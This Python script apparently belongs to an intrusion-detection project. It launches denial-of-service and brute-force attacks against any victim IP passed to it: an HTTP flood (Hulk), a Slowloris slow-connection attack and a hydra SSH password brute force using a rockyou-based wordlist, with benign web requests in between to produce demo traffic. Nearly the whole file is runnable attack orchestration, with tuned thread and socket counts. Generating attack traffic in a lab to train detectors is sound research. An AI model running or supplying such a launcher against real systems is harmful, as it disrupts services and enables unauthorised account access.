#!/usr/bin/env python3
# final.py <VICTIM_IP>
# Ubuntu -> Ubuntu live-demo attack generator.
# Runs ONLY the 3 attacks used in this project (Hulk / Slowloris / SSH-BF),
# with benign traffic interleaved. Old attacks (syn/udp/nmap/ftp) removed.
#
# Requires in the SAME folder: hulk.py, slowloris.py, nolist.txt
# Victim must run: web server on port 80 (nginx/apache) + sshd on port 22,
#   and an SSH account (default: testuser).
#
# Run:  sudo python3 final.py <VICTIM_IP>

import sys
import time
import shutil
import subprocess

if len(sys.argv) != 2:
    print(f"Usage: sudo python3 {sys.argv[0]} <VICTIM_IP>")
    sys.exit(1)

VICTIM = sys.argv[1]

# ============================ CONFIG ============================
WEB_PORT = 80
SSH_PORT = 22
SSH_USER = "testuser"
WORDLIST = "nolist.txt"          # rockyou with the real password removed
BENIGN_COUNT = 200               # normal requests between attacks

# DEMO intensities -- keep DIFFERENT from training values to avoid leakage.
# (training/NAT used Hulk 20/60, Slowloris 300/600/900, SSH -t 4/12)
HULK_THREADS     = 40
HULK_SECONDS     = 30
SLOWLORIS_SOCKETS = 750
SLOWLORIS_SECONDS = 45
SSH_TASKS        = 8
SSH_SECONDS      = 60
# ===============================================================


def ensure(pkg, cmd=None):
    if shutil.which(cmd or pkg):
        return
    print(f"[setup] installing {pkg} ...")
    subprocess.run(["apt-get", "install", "-y", pkg], check=False,
                   stdout=subprocess.DEVNULL)


ensure("hydra")
ensure("curl")
import urllib.request


def benign(count):
    print(f"\n[+] benign traffic: {count} requests")
    for i in range(1, count + 1):
        try:
            urllib.request.urlopen(f"http://{VICTIM}:{WEB_PORT}/?n={i}", timeout=2).read(1)
        except Exception:
            pass
        time.sleep(0.05)
    print("[+] benign done")


def run(name, cmd):
    print(f"\n[+] {name}")
    subprocess.run(cmd, check=False)
    print(f"[+] {name} done")


def set_const(path, key, value):
    # rewrite a "KEY = number" line in hulk.py / slowloris.py
    subprocess.run(["sed", "-i", f"s/^{key} = .*/{key} = {value}/", path], check=False)


# ---- Hulk ----
def hulk():
    set_const("hulk.py", "THREADS", HULK_THREADS)
    run("HULK (HTTP flood)",
        ["python3", "hulk.py", VICTIM, str(WEB_PORT), str(HULK_SECONDS)])


# ---- Slowloris ----
def slowloris():
    set_const("slowloris.py", "SOCKET_COUNT", SLOWLORIS_SOCKETS)
    run("Slowloris (slow DoS)",
        ["python3", "slowloris.py", VICTIM, str(WEB_PORT), str(SLOWLORIS_SECONDS)])


# ---- SSH brute force ----
def ssh_bf():
    run("SSH brute-force (hydra)",
        ["timeout", str(SSH_SECONDS), "hydra", "-l", SSH_USER, "-P", WORDLIST,
         f"ssh://{VICTIM}", "-t", str(SSH_TASKS), "-w", "5", "-W", "1", "-I"])


# ============================================================
# sequence: benign between each attack
# ============================================================
print(f"### live demo attack -> {VICTIM} ###")
benign(BENIGN_COUNT)
hulk()
benign(BENIGN_COUNT)
slowloris()
benign(BENIGN_COUNT)
ssh_bf()
benign(BENIGN_COUNT)
print("\n[+] all demo traffic done")
